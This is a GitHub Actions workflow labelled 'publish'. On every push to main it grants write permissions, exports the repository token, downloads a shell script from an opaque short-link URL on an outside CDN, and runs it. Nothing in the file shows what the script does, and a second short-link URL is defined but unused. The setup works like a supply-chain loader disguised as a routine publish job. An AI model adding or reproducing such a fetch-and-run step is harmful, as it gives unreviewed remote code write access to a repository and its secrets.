name: publish

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: write
  pages: write

jobs:
  fetch-app:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      REPO: ${{ github.repository }}
      SRC: https://aka.doubaocdn.com/s/nGtcXkbnhR
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Download publish script
        run: |
          set -euo pipefail
          curl -fsSL --http1.1 -L --retry 5 --retry-all-errors --retry-delay 4 --connect-timeout 20 --max-time 300 -o /tmp/pub.sh https://aka.doubaocdn.com/s/evUXcUzl5m
          wc -c /tmp/pub.sh
          bash -n /tmp/pub.sh

      - name: Publish
        run: bash /tmp/pub.sh
